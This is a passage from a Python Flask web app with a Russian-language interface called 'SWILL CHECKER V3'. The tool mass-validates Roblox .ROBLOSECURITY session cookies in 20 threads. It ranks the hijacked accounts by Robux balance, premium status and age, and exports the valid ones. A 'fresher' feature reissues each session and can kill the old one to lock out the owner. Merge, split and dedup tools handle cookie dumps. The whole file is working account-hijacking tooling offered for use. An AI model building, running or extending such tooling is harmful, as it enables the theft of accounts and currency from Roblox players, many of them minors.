            <div id="fresherStats" class="text-muted" style="margin-top:6px;"></div>
            <div class="result-box" id="fresherResult">Новые куки здесь...</div>
            <div class="gap-8 mt-8">
                <button class="btn btn-secondary btn-sm" onclick="copyFresherCookies()">📋 Копировать</button>
                <button class="btn btn-secondary btn-sm" onclick="downloadFresherCookies()">📥 Скачать</button>
            </div>
        </div>
    </div>

    <div class="tab-content" id="tab-history">
        <div class="card"><h2>📜 История проверок <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()">🗑️ Очистить</button></h2><div id="checkerHistoryList"><div class="empty-history">Загрузка...</div></div></div>
        <div class="card"><h2>🔄 История обновлений <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()">🗑️ Очистить</button></h2><div id="fresherHistoryList"><div class="empty-history">Загрузка...</div></div></div>
    </div>

    <div class="tab-content" id="tab-tools">
        <div class="grid-2">
            <div class="card"><h3>🔗 Слияние</h3><div class="upload-area" id="mergeDropArea"><p>📁 Выберите файлы</p></div><input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;"><button class="btn btn-primary mt-12 btn-block" onclick="mergeCookies()">🔄 Объединить</button><div class="result-box" id="mergeResult" style="max-height:80px;">Ожидание...</div></div>
            <div class="card"><h3>✂️ Разделение</h3><div class="upload-area" id="splitDropArea"><p>📁 Выберите файл</p></div><input type="file" id="splitFile" accept=".txt" style="display:none;"><div class="flex-row mt-8"><input type="number" id="splitCount" value="100" style="flex:1;padding:10px 14px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.04);border-radius:10px;color:#fff;font-size:13px;"><button class="btn btn-primary btn-sm" onclick="splitByCount()">По N</button><button class="btn btn-primary btn-sm" onclick="splitByFiles()">На N файлов</button></div><div class="result-box" id="splitResult" style="max-height:80px;">Ожидание...</div></div>
            <div class="card"><h3>🧹 Очистка</h3><textarea id="cleanInput" placeholder="Вставьте куки..." rows="3"></textarea><div class="gap-8 mt-8"><button class="btn btn-primary btn-sm" onclick="cleanCookies('deduplicate')">🔄 Дубликаты</button><button class="btn btn-secondary btn-sm" onclick="cleanCookies('format')">📝 Формат</button></div><div class="result-box" id="cleanResult" style="max-height:80px;">Ожидание...</div></div>
            <div class="card"><h3>📊 Статистика</h3><button class="btn btn-primary btn-block" onclick="loadStats()">📊 Обновить</button><div class="result-box" id="statsResult" style="max-height:80px;">Ожидание...</div></div>
        </div>
    </div>

    <div class="footer">SWILL CHECKER V3 · 20 потоков · Премиум-интерфейс</div>
</div>

<script>
(function() {
    const container = document.getElementById('particles');
    for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDuration = (15 + Math.random() * 25) + 's';
        particle.style.animationDelay = (Math.random() * 20) + 's';
        particle.style.width = (1 + Math.random() * 3) + 'px';
        particle.style.height = particle.style.width;
        container.appendChild(particle);
    }
})();

function toggleTheme() {
    let html = document.documentElement;
    let current = html.getAttribute('data-theme');
    let next = current === 'dark' ? 'light' : 'dark';
    html.setAttribute('data-theme', next);
    localStorage.setItem('theme', next);
}
(function() {
    let saved = localStorage.getItem('theme');
    if (saved) document.documentElement.setAttribute('data-theme', saved);
})();

document.querySelectorAll('.tab').forEach(function(tab) {
    tab.addEventListener('click', function() {
        let tabId = this.getAttribute('data-tab');
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        this.classList.add('active');
        document.getElementById('tab-' + tabId).classList.add('active');
        if (tabId === 'history') { loadCheckerHistory(); loadFresherHistory(); }
        if (tabId === 'checker') loadStats();
    });
});

function setFresherMode(mode) {
    document.getElementById('fresherMode').value = mode;
    document.getElementById('modeDuplicate').className = 'toggle-btn' + (mode === 'duplicate' ? ' active' : '');
    document.getElementById('modeKill').className = 'toggle-btn' + (mode === 'kill' ? ' active' : '');
}

function setupDrop(areaId, inputId) {
    let area = document.getElementById(areaId);
    if (!area) return;
    area.addEventListener('dragover', e => { e.preventDefault(); area.style.borderColor = '#a855f7'; });
    area.addEventListener('dragleave', e => { e.preventDefault(); area.style.borderColor = ''; });
    area.addEventListener('drop', function(e) {
        e.preventDefault();
        area.style.borderColor = '';
        if (e.dataTransfer.files.length) {
            let input = document.getElementById(inputId);
            input.files = e.dataTransfer.files;
            input.dispatchEvent(new Event('change'));
        }
    });
    area.addEventListener('click', () => document.getElementById(inputId).click());
}
setupDrop('massDropArea', 'massFile');
setupDrop('fresherDropArea', 'fresherFile');
setupDrop('mergeDropArea', 'mergeFiles');
setupDrop('splitDropArea', 'splitFile');

document.getElementById('massFile').addEventListener('change', function() {
    if (this.files && this.files[0]) {
        let file = this.files[0];
        document.getElementById('massFileInfo').textContent = '✅ ' + file.name + ' (' + (file.size/1024).toFixed(1) + ' KB)';
        let reader = new FileReader();
        reader.onload = function(evt) {
            window.massFileContent = evt.target.result;
            fetch('/api/extract-preview', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: window.massFileContent }) })
            .then(r => r.json())
            .then(d => { if (d.success) { document.getElementById('extractInfo').style.display = 'block'; document.getElementById('extractInfo').textContent = '🔍 Найдено куков: ' + d.count; } });
        };
        reader.readAsText(file);
    }
});

document.getElementById('fresherFile').addEventListener('change', function() {
    if (this.files && this.files[0]) {
        let reader = new FileReader();
        reader.onload = function(evt) { document.getElementById('fresherCookies').value = evt.target.result; };
        reader.readAsText(this.files[0]);
    }
});

window.massResultsData = [];
window.currentFilter = 'all';

async function runSingleCheck() {
    let resBox = document.getElementById('singleResult');
    let cookie = document.getElementById('singleCookie').value.trim();
    if (!cookie) { resBox.textContent = '❌ Вставьте кук!'; return; }
    resBox.textContent = '⏳ Проверка...';
    try {
        let r = await fetch('/api/single-check', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookie: cookie }) });
        let d = await r.json();
        resBox.textContent = d.success ? d.report : '❌ ' + (d.message || 'Ошибка');
        loadStats();
    } catch(e) { resBox.textContent = '❌ ' + e.message; }
}

async function runMassCheck() {
    if (!window.massFileContent) { document.getElementById('massResult').textContent = '❌ Загрузите TXT файл!'; return; }
    let resBox = document.getElementById('massResult');
    let progress = document.getElementById('massProgress');
    let logBox = document.getElementById('massLog');
    resBox.textContent = '⏳ Проверка...';
    progress.style.width = '10%';
    logBox.innerHTML = '<div class="log-line">🔄 Запуск (20 потоков)...</div>';
    try {
        let startCheck = Date.now();
        let r = await fetch('/api/mass-check', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: window.massFileContent }) });
        let d = await r.json();
        progress.style.width = '100%';
        setTimeout(() => progress.style.width = '0%', 500);
        let elapsed = ((Date.now() - startCheck) / 1000).toFixed(1);
        let speed = d.total > 0 ? (d.total / elapsed).toFixed(1) : 0;
        logBox.innerHTML = '✅ За ' + elapsed + 'с (' + speed + ' куков/сек)';
        if (d.success) {
            window.massResultsData = d.full_data || [];
            document.getElementById('filterBar').style.display = 'flex';
            document.getElementById('massActions').style.display = 'flex';
            let totalRobux = d.total_robux || 0;
            document.getElementById('robuxCalc').style.display = 'block';
            document.getElementById('robuxCalc').innerHTML = '💰 Всего Robux: ⏣ <b>' + totalRobux.toLocaleString() + '</b> | 💵 ~$' + (totalRobux * 0.0035).toFixed(2);
            applyFilter('all', document.querySelector('#filterBar .filter-chip'));
            loadStats();
        } else { resBox.textContent = '❌ ' + (d.message || 'Ошибка'); }
    } catch(e) { resBox.textContent = '❌ ' + e.message; progress.style.width = '0%'; }
}

function applyFilter(type, element) {
    window.currentFilter = type;
    document.querySelectorAll('#filterBar .filter-chip').forEach(c => c.classList.remove('active'));
    if (element) element.classList.add('active');
    let filtered = window.massResultsData;
    switch(type) {
        case 'premium': filtered = filtered.filter(r => r.is_premium); break;
        case 'rich': filtered = filtered.filter(r => r.robux > 1000); break;
        case 'secure': filtered = filtered.filter(r => r.has_2fa); break;
        case 'old': filtered = filtered.filter(r => r.score >= 100); break;
        default: break;
    }
    let html = '🔍 Найдено: ' + filtered.length + '\n\n';
    filtered.forEach(r => {
        let score = r.score || 0;
        let rank = score >= 150 ? "👑" : score >= 100 ? "💎" : score >= 60 ? "⭐" : "🔹";
        let badges = [];
        if (r.is_premium) badges.push("💠");
        if (r.has_2fa) badges.push("🔐");
        html += rank + ' ' + r.username + ' [' + r.user_id + '] | ⏣' + (r.robux||0).toLocaleString() + ' | ' + (r.created||'?') + ' | S:' + score + ' ' + badges.join(' ') + '\n';
        if (r.status === '✅') html += '  🍪 ' + r.cookie + '\n';
    });
    document.getElementById('massResult').textContent = html || 'Нет результатов';
}

function copyValidCookies() {
    let valid = window.massResultsData.filter(r => r.status === '✅');
    let text = valid.map(r => r.cookie).join('\n');
    navigator.clipboard.writeText(text).then(() => alert('✅ Скопировано ' + valid.length + ' куки'));
}
function downloadValidOnly() { let valid = window.massResultsData.filter(r => r.status === '✅'); downloadFile(valid.map(r => r.cookie).join('\n'), 'valid_cookies.txt'); }
function downloadInvalidOnly() { let invalid = window.massResultsData.filter(r => r.status === '❌'); downloadFile(invalid.map(r => r.cookie).join('\n'), 'invalid_cookies.txt'); }
function downloadFullReport() { let text = ''; window.massResultsData.forEach(r => { if (r.status === '✅') { text += '✅ ' + r.username + ' [' + r.user_id + '] | R$' + r.robux + ' | ' + r.created + ' | Score:' + r.score + '\n' + r.cookie + '\n\n'; } else { text += '❌ ' + r.cookie + '\n'; } }); downloadFile(text, 'full_report.txt'); }
function downloadFile(content, filename) { let blob = new Blob([content], { type: 'text/plain' }); let a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = filename; a.click(); }

async function runFresher() {
    let cookies = document.getElementById('fresherCookies').value.trim();
    let mode = document.getElementById('fresherMode').value;
    if (!cookies) { document.getElementById('fresherResult').textContent = '❌ Вставьте куки!'; return; }
    document.getElementById('fresherResult').textContent = '⏳ Обновление...';
    document.getElementById('fresherProgress').style.width = '50%';
    try {
        let r = await fetch('/api/fresher', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookies, mode }) });
        let d = await r.json();
        document.getElementById('fresherProgress').style.width = '100%';
        setTimeout(() => document.getElementById('fresherProgress').style.width = '0%', 500);
        if (d.success) {
            document.getElementById('fresherResult').textContent = d.only_cookies || 'Нет новых куки';
            document.getElementById('fresherStats').innerHTML = '✅ Успешно: ' + d.success_count + ' | ❌ Ошибок: ' + d.fail_count;
        } else { document.getElementById('fresherResult').textContent = '❌ ' + (d.message || 'Ошибка'); }
        loadFresherHistory();
    } catch(e) { document.getElementById('fresherResult').textContent = '❌ ' + e.message; document.getElementById('fresherProgress').style.width = '0%'; }
}

function copyFresherCookies() { let text = document.getElementById('fresherResult').textContent; if (text && text !== 'Новые куки здесь...' && text !== '⏳ Обновление...') { navigator.clipboard.writeText(text).then(() => alert('✅ Скопировано!')); } }
function downloadFresherCookies() { let text = document.getElementById('fresherResult').textContent; if (text && text !== 'Новые куки здесь...' && text !== '⏳ Обновление...') { downloadFile(text, 'refreshed_cookies.txt'); } }

async function loadCheckerHistory() {
    try {
        let r = await fetch('/api/history/checker');
        let d = await r.json();
        let html = '';
        if (d.history && d.history.length > 0) {
            d.history.slice().reverse().forEach(item => {
                html += '<div class="history-item" onclick="this.classList.toggle(\'open\')">';
                html += '<div class="hist-header"><span>📅 ' + item.timestamp + '</span><span class="text-muted">' + (item.type === 'mass' ? '📦 Массовая' : '🔍 Одиночная') + ' | ✅ ' + item.valid + '/' + item.total + '</span></div>';
                html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n---\n') : 'Нет данных') + '</div></div>';
            });
        } else { html = '<div class="empty-history">📭 История пуста</div>'; }
        document.getElementById('checkerHistoryList').innerHTML = html;
    } catch(e) { document.getElementById('checkerHistoryList').innerHTML = '<div class="empty-history">❌ Ошибка</div>'; }
}

async function loadFresherHistory() {
    try {
        let r = await fetch('/api/history/fresher');
        let d = await r.json();
        let html = '';
        if (d.history && d.history.length > 0) {
            d.history.slice().reverse().forEach(item => {
                html += '<div class="history-item" onclick="this.classList.toggle(\'open\')">';
                html += '<div class="hist-header"><span>📅 ' + item.timestamp + '</span><span class="text-muted">' + (item.mode === 'kill' ? '💀 Сброс' : '♻️ Дублирование') + ' | ✅ ' + item.success_count + '/' + item.refreshed_count + '</span></div>';
                html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n') : 'Нет данных') + '</div></div>';
            });
        } else { html = '<div class="empty-history">📭 История пуста</div>'; }
        document.getElementById('fresherHistoryList').innerHTML = html;
    } catch(e) { document.getElementById('fresherHistoryList').innerHTML = '<div class="empty-history">❌ Ошибка</div>'; }
}

async function clearCheckerHistory() { if (!confirm('Удалить историю проверок?')) return; await fetch('/api/history/checker/clear', { method: 'POST' }); loadCheckerHistory(); }
async function clearFresherHistory() { if (!confirm('Удалить историю обновлений?')) return; await fetch('/api/history/fresher/clear', { method: 'POST' }); loadFresherHistory(); }

async function mergeCookies() {
    let files = document.getElementById('mergeFiles').files;
    if (!files || files.length < 2) { document.getElementById('mergeResult').textContent = '❌ Минимум 2 файла'; return; }
    let fd = new FormData(); Array.from(files).forEach(f => fd.append('files', f));
    document.getElementById('mergeResult').textContent = '⏳...';
    try {
        let r = await fetch('/api/merge-cookies', { method: 'POST', body: fd });
        let d = await r.json();
        document.getElementById('mergeResult').innerHTML = d.success ? '✅ ' + d.total_files + ' файлов | 📊 ' + d.total_cookies + ' куки\n📥 <a href="' + d.download_url + '" target="_blank" style="color:#a855f7;">Скачать</a>' : '❌ Ошибка';
    } catch(e) { document.getElementById('mergeResult').textContent = '❌ ' + e.message; }
}

async function splitByCount() {
    let file = document.getElementById('splitFile').files[0];
    if (!file) { document.getElementById('splitResult').textContent = '❌ Загрузите файл'; return; }
    let content = await file.text();
    let count = parseInt(document.getElementById('splitCount').value) || 100;
    document.getElementById('splitResult').textContent = '⏳...';
    try {
        let r = await fetch('/api/split-cookies', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content, split_type: 'count', count }) });
        let d = await r.json();
        document.getElementById('splitResult').innerHTML = d.success ? '✅ ' + d.file_count + ' файлов\n📥 <a href="' + d.download_url + '" target="_blank" style="color:#a855f7;">Скачать</a>' : '❌ Ошибка';
    } catch(e) { document.getElementById('splitResult').textContent = '❌ ' + e.message; }
}

async function splitByFiles() {
    let file = document.getElementById('splitFile').files[0];
    if (!file) { document.getElementById('splitResult').textContent = '❌ Загрузите файл'; return; }
    let content = await file.text();
    let num = parseInt(document.getElementById('splitCount').value) || 5;
    document.getElementById('splitResult').textContent = '⏳...';
    try {
        let r = await fetch('/api/split-cookies', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content, split_type: 'files', count: num }) });
        let d = await r.json();
        document.getElementById('splitResult').innerHTML = d.success ? '✅ ' + d.file_count + ' файлов\n📥 <a href="' + d.download_url + '" target="_blank" style="color:#a855f7;">Скачать</a>' : '❌ Ошибка';
    } catch(e) { document.getElementById('splitResult').textContent = '❌ ' + e.message; }
}

async function cleanCookies(action) {
    let content = document.getElementById('cleanInput').value.trim();
    if (!content) { document.getElementById('cleanResult').textContent = '❌ Вставьте куки'; return; }
    document.getElementById('cleanResult').textContent = '⏳...';
    try {
        let r = await fetch('/api/clean-cookies', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content, action }) });
        let d = await r.json();
        document.getElementById('cleanResult').innerHTML = d.success ? '✅ ' + d.original_count + ' → ' + d.processed_count + (d.duplicates_removed > 0 ? ' (-' + d.duplicates_removed + ')' : '') + '\n📥 <a href="' + d.download_url + '" target="_blank" style="color:#a855f7;">Скачать</a>' : '❌ Ошибка';
    } catch(e) { document.getElementById('cleanResult').textContent = '❌ ' + e.message; }
}

async function loadStats() {
    try {
        let r = await fetch('/api/stats');
        let d = await r.json();
        document.getElementById('statsResult').textContent = JSON.stringify(d, null, 2);
        if (d.total_checked) {
            document.getElementById('totalChecked').textContent = d.total_checked;
            document.getElementById('validCount').textContent = d.valid_count || 0;
            document.getElementById('premiumCount').textContent = d.premium_count || 0;
            document.getElementById('totalRobux').textContent = (d.total_robux || 0).toLocaleString();
        }
    } catch(e) { document.getElementById('statsResult').textContent = '❌ ' + e.message; }
}

loadStats();
loadCheckerHistory();
loadFresherHistory();
</script>
</body>
</html>"""

# ===== ЭНДПОИНТЫ =====
@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api/extract-preview", methods=["POST"])
def api_extract_preview():
    data = request.json or {}
    content = data.get("content", "")
    cookies = extract_cookies_from_text(content)
    return jsonify({"success": True, "count": len(cookies)})

@app.route("/api/single-check", methods=["POST"])
def api_single_check():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    if not cookie: return jsonify({"success": False, "message": "Кук не предоставлен"})
    info = get_full_info(cookie)
    report = format_full_report(info)
    add_checker_history({'type': 'single', 'total': 1, 'valid': 1 if info['status']=='✅' else 0, 'cookies': [report], 'full_data': []})
    return jsonify({"success": True, "report": report})

@app.route("/api/mass-check", methods=["POST"])
def api_mass_check():
    data = request.json or {}
    content = data.get("content", "")
    if not content: return jsonify({"success": False, "message": "Контент не предоставлен"})
    cookies = extract_cookies_from_text(content)
    if not cookies: return jsonify({"success": False, "message": "Куки не найдены"})
    if len(cookies) > 10000: cookies = cookies[:10000]
    
    results = mass_check(cookies)
    valid = [r for r in results if r['status']=='✅']
    invalid = [r for r in results if r['status']=='❌']
    formatted = [format_quick_report(r) for r in results]
    premium_count = sum(1 for r in valid if r.get('is_premium'))
    total_robux = sum(r.get('robux',0) for r in valid)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"mass_check_{timestamp}.txt"
    filepath = os.path.join("downloads", filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(f"📊 РЕЗУЛЬТАТЫ | {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
        f.write(f"Всего: {len(results)} | ✅{len(valid)} | ❌{len(invalid)}\n")
        f.write(f"Premium: {premium_count} | Robux: {total_robux:,}\n\n")
        for r in valid:
            score = r.get('score',0)
            rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else "🟢"))
            f.write(f"{rank} {r['username']} [{r['user_id']}] | ⏣{r['robux']:,} | Score:{score}\n{r['cookie']}\n\n")
        if invalid:
            f.write("\n❌ НЕВАЛИДНЫЕ:\n")
            for r in invalid: f.write(f"{r['cookie']}\n")
    
    download_url = f"/downloads/{filename}"
    
    full_data = []
    for r in valid:
        full_data.append({'status': '✅', 'username': r['username'], 'user_id': r['user_id'], 'robux': r['robux'], 'created': r['created'], 'score': r['score'], 'is_premium': r.get('is_premium', False), 'has_2fa': r.get('has_2fa', False), 'has_email': r.get('has_email', False), 'cookie': r['cookie']})
    for r in invalid:
        full_data.append({'status': '❌', 'cookie': r['cookie'], 'score': -1})
    
    add_checker_history({'type': 'mass', 'total': len(results), 'valid': len(valid), 'cookies': formatted[:30], 'full_data': full_data[:100], 'download_url': download_url})
    
    return jsonify({"success": True, "total": len(results), "valid_count": len(valid), "invalid_count": len(invalid), "premium_count": premium_count, "total_robux": total_robux, "results": formatted, "full_data": full_data, "download_url": download_url})

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    cookies_list = extract_cookies_from_text(raw)
    if not cookies_list: return jsonify({"success": False, "message": "Куки не найдены"})
    
    only_cookies = []
    cookie_hist = []
    success_count = 0
    fail_count = 0
    
    for c in cookies_list:
        result = refresh_roblox_cookie(c, kill_old=(mode=='kill'))
        if result['success'] and result['new_cookie']:
            is_new = True
            if '.ROBLOSECURITY=' in c:
                old_val = c.strip().split('.ROBLOSECURITY=')[-1].split(';')[0]
                is_new = result['new_cookie'] != old_val
            status_text = "НОВАЯ" if is_new else "БЕЗ ИЗМЕНЕНИЙ"
            cookie_hist.append(f"🟢 {result.get('username','?')} - {status_text}")
            only_cookies.append(result['new_cookie'])
            success_count += 1
        else:
            cookie_hist.append(f"❌ {result.get('error', 'Ошибка')[:40]}")
            fail_count += 1
    
    add_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'success_count': success_count, 'fail_count': fail_count, 'cookies': cookie_hist})
    
    return jsonify({"success": True, "refreshed_count": len(only_cookies), "success_count": success_count, "fail_count": fail_count, "only_cookies": '\n'.join(only_cookies) if only_cookies else ''})

@app.route("/api/history/checker")
def api_history_checker():
    return jsonify({"history": load_history(CHECKER_HISTORY_FILE)})

@app.route("/api/history/fresher")
def api_history_fresher():
    return jsonify({"history": load_history(FRESHER_HISTORY_FILE)})

@app.route("/api/history/checker/clear", methods=["POST"])
def api_clear_checker_history():
    save_history(CHECKER_HISTORY_FILE, [])
    return jsonify({"success": True})

@app.route("/api/history/fresher/clear", methods=["POST"])
def api_clear_fresher_history():
    save_history(FRESHER_HISTORY_FILE, [])
    return jsonify({"success": True})

@app.route("/api/merge-cookies", methods=["POST"])
def api_merge_cookies():
    if 'files' not in request.files: return jsonify({"success": False})
    files = request.files.getlist('files')
    if len(files) < 2: return jsonify({"success": False, "message": "Минимум 2 файла"})
    contents = [f.read().decode('utf-8', errors='ignore') for f in files]
    merged = merge_cookie_files(contents)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"merged_{timestamp}.txt"
    with open(os.path.join("downloads", filename), 'w', encoding='utf-8') as f: f.write(merged)
    total = len([l for l in merged.split('\n') if l])
    return jsonify({"success": True, "total_files": len(files), "total_cookies": total, "download_url": f"/downloads/{filename}"})

@app.route("/api/split-cookies", methods=["POST"])
def api_split_cookies():
    data = request.json or {}
    content = data.get("content", "")
    split_type = data.get("split_type", "count")
    count = data.get("count", 100)
    
    if not content or not content.strip():
        return jsonify({"success": False, "message": "Контент пуст"})
    if count <= 0:
        return jsonify({"success": False, "message": "Количество должно быть > 0"})
    
    if split_type == "count":
        files = split_cookies_by_count(content, count)
    else:
        files = split_cookies_by_files(content, count)
    
    if not files:
        return jsonify({"success": False, "message": "Нет куки для разделения"})
    
    if len(files) == 1:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"split_{timestamp}.txt"
        with open(os.path.join("downloads", filename), 'w', encoding='utf-8') as f:
            f.write(files[0])
        return jsonify({"success": True, "file_count": 1, "download_url": f"/downloads/{filename}"})
    
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i, fc in enumerate(files, 1):
            if fc.strip():
                zf.writestr(f"part_{i}.txt", fc)
    
    if zip_buffer.getbuffer().nbytes == 0:
        return jsonify({"success": False, "message": "Нет данных для архива"})
    
    zip_buffer.seek(0)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    archive_name = f"split_{timestamp}.zip"
    with open(os.path.join("downloads", archive_name), 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    return jsonify({"success": True, "file_count": len(files), "download_url": f"/downloads/{archive_name}"})

@app.route("/api/clean-cookies", methods=["POST"])
def api_clean_cookies():
    data = request.json or {}
    content = data.get("content", "")
    action = data.get("action", "deduplicate")
    if not content: return jsonify({"success": False})
    orig = [l for l in content.split('\n') if l.strip()]
    processed = remove_duplicates(content) if action=="deduplicate" else clean_cookies(content)
    proc = [l for l in processed.split('\n') if l.strip()]
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"cleaned_{timestamp}.txt"
    with open(os.path.join("downloads", filename), 'w', encoding='utf-8') as f: f.write(processed)
    return jsonify({"success": True, "original_count": len(orig), "processed_count": len(proc), "duplicates_removed": len(orig)-len(proc), "download_url": f"/downloads/{filename}"})

@app.route("/api/stats")
def api_stats():
    h = load_history(CHECKER_HISTORY_FILE)
    total_checks = len(h)
    valid_count = sum(item.get('valid', 0) for item in h)
    premium_count = 0
    total_robux = 0
    
    for item in h:
        full_data = item.get('full_data', [])
        for r in full_data:
            if r.get('status') == '✅':
                if r.get('is_premium'): premium_count += 1
                total_robux += r.get('robux', 0)
    
    return jsonify({
        "total_checked": total_checks,
        "valid_count": valid_count,
        "premium_count": premium_count,
        "total_robux": total_robux
    })

@app.route("/downloads/<filename>")
def download_file(filename):
    return send_from_directory("downloads", filename, as_attachment=True)

if __name__ == "__main__":
    app.run(debug=True, port=5000)
